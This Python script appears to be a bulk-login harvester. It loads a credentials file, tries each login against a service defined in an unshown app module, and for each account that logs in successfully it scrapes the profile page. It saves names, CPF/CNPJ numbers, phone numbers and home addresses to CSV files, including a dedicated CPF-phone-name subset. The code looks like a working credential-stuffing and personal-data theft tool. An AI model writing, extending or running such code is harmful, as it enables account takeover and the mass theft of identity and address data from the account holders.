"""Entry point for executing the login request workflow."""

from __future__ import annotations

from collections.abc import Mapping
import csv
import json
from html.parser import HTMLParser
from pathlib import Path

OUTPUT_DIRECTORY = Path(__file__).resolve().parent / "saida"
OUTPUT_FILE = OUTPUT_DIRECTORY / "dados.csv"
CSV_FIELD_ORDER = [
    "nome",
    "cpf_cnpj",
    "telefone",
    "cidade",
    "logradouro",
    "numero",
    "uf",
    "cep",
]

SUBSET_DIRECTORY = OUTPUT_DIRECTORY / "subsets"
SUBSET_FILE = SUBSET_DIRECTORY / "cpf_telefone_nome.csv"
SUBSET_FIELD_ORDER = ["cpf_cnpj", "telefone", "nome"]
ADDRESS_SUBSET_FILE = SUBSET_DIRECTORY / "enderecos.csv"
ADDRESS_FIELD_ORDER = ["cidade", "logradouro", "numero", "uf", "cep"]


def _extract_uid(body: Mapping[str, object] | str) -> str | None:
    """Return the ``uid_usuario`` value for successful login responses."""

    if not isinstance(body, Mapping):
        return None

    erro = body.get("erro")
    uid = body.get("uid_usuario")

    if str(erro) != "0" or not isinstance(uid, str) or not uid:
        return None

    return uid


from app import (
    DEFAULT_CREDENTIALS_FILE,
    DEFAULT_LOGIN_REQUEST,
    CredentialFormatError,
    LoginClient,
    iter_login_requests,
    load_credentials,
)


class _ProfileInputParser(HTMLParser):
    """Extract text-like input values keyed by their ``id`` attributes."""

    def __init__(self) -> None:
        super().__init__()
        self.fields: dict[str, str] = {}
        self._allowed_types = {"text", "email", "int"}

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:  # type: ignore[override]
        if tag.lower() != "input":
            return

        attributes = {key: (value or "") for key, value in attrs}
        if attributes.get("type", "").lower() not in self._allowed_types:
            return

        field_id = attributes.get("id", "")
        field_value = attributes.get("value")

        if field_id and field_value is not None:
            self.fields[field_id] = field_value


def _extract_profile_fields(body: Mapping[str, object] | str) -> Mapping[str, str]:
    """Return profile input fields extracted from an HTML body."""

    if not isinstance(body, str):
        return {}

    parser = _ProfileInputParser()
    parser.feed(body)
    return parser.fields


def _write_successful_records(records: list[Mapping[str, str]]) -> None:
    """Persist successful record data to ``OUTPUT_FILE`` in CSV format."""

    OUTPUT_DIRECTORY.mkdir(parents=True, exist_ok=True)

    filtered_records = [
        {field: record.get(field, "") for field in CSV_FIELD_ORDER}
        for record in records
    ]

    with OUTPUT_FILE.open("w", encoding="utf-8", newline="") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=CSV_FIELD_ORDER)
        writer.writeheader()
        writer.writerows(filtered_records)

    SUBSET_DIRECTORY.mkdir(parents=True, exist_ok=True)

    subset_records = [
        {field: record.get(field, "") for field in SUBSET_FIELD_ORDER}
        for record in filtered_records
    ]

    with SUBSET_FILE.open("w", encoding="utf-8", newline="") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=SUBSET_FIELD_ORDER)
        writer.writeheader()
        writer.writerows(subset_records)

    address_records = [
        {field: record.get(field, "") for field in ADDRESS_FIELD_ORDER}
        for record in filtered_records
    ]

    with ADDRESS_SUBSET_FILE.open("w", encoding="utf-8", newline="") as csv_file:
        writer = csv.DictWriter(csv_file, fieldnames=ADDRESS_FIELD_ORDER)
        writer.writeheader()
        writer.writerows(address_records)


def main(credentials_file: str | Path | None = None) -> None:
    """Execute the login workflow for all credentials in ``credentials_file``."""

    source = Path(credentials_file) if credentials_file else DEFAULT_CREDENTIALS_FILE
    client = LoginClient()

    try:
        credential_sets = load_credentials(source)
    except (FileNotFoundError, CredentialFormatError) as exc:
        raise SystemExit(str(exc)) from exc

    successful_records: list[dict[str, str]] = []

    for request in iter_login_requests(DEFAULT_LOGIN_REQUEST, credential_sets):
        login = request.credentials.get("login", "<unknown>")
        print(f"=== Login: {login} ===")
        response = client.authenticate(request)
        print(response.status_code)
        print(response.body)

        uid = _extract_uid(response.body)
        if not uid:
            continue

        profile = client.fetch_user_profile(uid, request.headers)
        print(profile.status_code)

        fields = _extract_profile_fields(profile.body)
        if fields:
            print(json.dumps(fields, ensure_ascii=False))

            record = {key: str(value) for key, value in fields.items()}
            successful_records.append(record)
        else:
            print(profile.body)


    if successful_records:
        _write_successful_records(successful_records)


if __name__ == "__main__":
    main()
